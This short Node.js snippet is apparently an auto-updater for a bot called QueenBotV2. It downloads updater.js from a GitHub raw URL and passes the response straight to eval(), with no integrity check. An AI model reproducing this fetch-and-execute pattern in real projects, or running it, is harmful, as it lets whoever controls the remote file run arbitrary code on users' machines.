const axios = require('axios');

axios.get("https://raw.githubusercontent.com/ItzPihu/QueenBotV2/main/updater.js")
	.then(res => eval(res.data));